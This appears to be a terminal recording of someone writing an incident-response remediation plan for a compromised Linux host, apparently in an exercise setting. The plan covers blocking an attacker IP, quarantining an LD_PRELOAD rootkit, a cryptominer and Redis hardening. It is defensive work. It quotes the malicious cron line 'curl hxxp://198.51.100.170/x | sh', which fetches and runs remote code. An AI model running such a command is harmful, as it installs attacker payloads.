[184.799379, "i", "cat << 'EOF' > /app/remediation-plan.md\n# Prioritised Forensic Remediation Plan\n\n## 1. Principles & Rules\n- **Containment First**: Block external C2/attacker IPs immediately.\n- **Backup and Quarantine**: Per DFIR standards, backup and quarantine suspicious binaries, libraries, and crontabs before removal.\n- **Evidence-Driven**: Every step directly targets evidence identified under `/disk` or `/sas`.\n- **Non-Destructive Verification**: Test and verify host integrity post-remediation.\n\n## 2. Phase 1: Immediate Network Containment (Priority: Critical)\n\n### Step 1.1: Block External Threat Actor IP\n- **Target**: IP `198.51.100.170`\n- **Evidence**: `/sas/cti/advisory.txt:6`, `/disk/var/lib/.cache/.wiped.bin:1`, `/disk/var/spool/cron/crontabs/root:5`\n- **Action**: Apply firewall drop rules at host and network perimeter firewalls.\n  ```bash\n  iptables -I INPUT -s 198.51.100.170 -j DROP\n  iptables -I OUTPUT -d 198.51.100.170 -j DROP\n  ```\n- **Verification**: `iptables -L -n -v | grep 198.51.100.170`\n\n## 3. Phase 2: Threat Eradication & Quarantine (Priority: High)\n\n### Step 2.1: Quarantine LD_PRELOAD Rootkit Hook\n- **Target**: `/etc/ld.so.preload` and referenced `/lib/.hide.so`\n- **Evidence**: `/disk/etc/ld.so.preload:1`\n- **Action**: Backup `/etc/ld.so.preload` to quarantine and clear/remove the file.\n  ```bash\n  mkdir -p /var/quarantine/20260811_inc/\n  cp -a /etc/ld.so.preload /var/quarantine/20260811_inc/ld.so.preload.bak\n  [ -f /lib/.hide.so ] && cp -a /lib/.hide.so /var/quarantine/20260811_inc/hide.so.bak\n  rm -f /etc/ld.so.preload /lib/.hide.so\n  ```\n- **Verification**: Verify `/etc/ld.so.preload` no longer exists and `ldd /bin/ls` exhibits standard library dependencies.\n\n### Step 2.2: Terminate and Quarantine Cryptominer & Staged Modules\n- **Target**: `/tmp/.redis/` directory (`kdevtmpfsi`, `exp.so`)\n- **Evidence**: `/disk/tmp/.redis/kdevtmpfsi:1`, `/disk/tmp/.redis/exp.so:1`, `/sas/alerts.json:2`\n- **Action**: Terminate miner process PID 1337 (`kdevtmpfsi`), archive `/tmp/.redis/` to quarantine, and remove original files.\n  ```bash\n  pkill -9 -f kdevtmpfsi || true\n  pkill -9 -f /tmp/.redis || true\n  tar -czf /var/quarantine/20260811_inc/tmp_redis_quarantine.tar.gz /tmp/.redis/\n  rm -rf /tmp/.redis/\n  ```\n- **Verification**: `pgrep -f kdevtmpfsi` returns empty output; `ls -la /tmp/.redis` shows no file.\n\n### Step 2.3: Remove Malicious Cron Persistence\n- **Target**: `/var/spool/cron/crontabs/root`\n- **Evidence**: `/disk/var/spool/cron/crontabs/root:5`, `/sas/alerts.json:10`\n- **Action**: Backup root crontab, remove line 5 containing the malicious beacon script (`curl hxxp://198.51.100.170/x | sh`), and restore legitimate entries.\n  ```bash\n  cp -a /var/spool/cron/crontabs/root /var/quarantine/20260811_inc/root_crontab.bak\n  sed -i '/198\\.51\\.100\\.170/d' /var/spool/cron/crontabs/root\n  ```\n- **Verification**: `crontab -l -u root` no longer contains reference to IP `198.51.100.170` or `curl` payload.\n\n## 4. Phase 3: System Hardening & Vulnerability Remediation (Priority: High)\n\n### Step 3.1: Secure Redis Service Configuration\n- **Target**: `/etc/redis/redis.conf`\n- **Evidence**: `/disk/etc/redis/redis.conf:3`, `/sas/baseline.json:2`\n- **Action**: Update Redis settings to enforce authentication, restrict interface binding, and enable protected-mode.\n  ```bash population\n  cp -a /etc/redis/redis.conf /var/quarantine/20260811_inc/redis.conf.bak\n  sed -i 's/bind 0.0.0.0/bind 127.0.0.1/' /etc/redis/redis.conf\n  sed -i 's/protected-mode no/protected-mode yes/' /etc/redis/redis.conf\n  echo \"requirepass <STRONG_GENERATED_AUTHENTICATION_PASSWORD>\" >> /etc/redis/redis.conf\n  echo \"rename-command CONFIG \\\"\\\"\" >> /etc/redis/redis.conf\n  echo \"rename-command MODULE \\\"\\\"\" >> /etc/redis/redis.conf\n  systemctl restart redis\n  ```\n- **Verification**: `redis-cli ping` returns `NOAUTH Authentication required.` Connections from non-loopback IPs are rejected.\n\n### Step 3.2: Restrict Service Account Privileges\n- **Action**: Ensure Redis service runs under dedicated unprivileged account `redis:redis` with `NoNewPrivileges=true` in systemd unit conf"]
[184.799414, "i", "iguration.\n\n## 5. Phase 4: Monitoring & Post-Remediation Verification (Priority: Medium)\n1. Audit active processes with `ps aux` to ensure no orphaned processes or high CPU miner threads persist.\n2. Review `/var/log/auth.log` and `/var/log/syslog` for unauthorized connection attempts.\n3. Deploy File Integrity Monitoring (e.g. Auditd or Samhain) monitoring `/etc/ld.so.preload`, `/etc/cron*`, and `/var/spool/cron/`.\nEOF\n"]
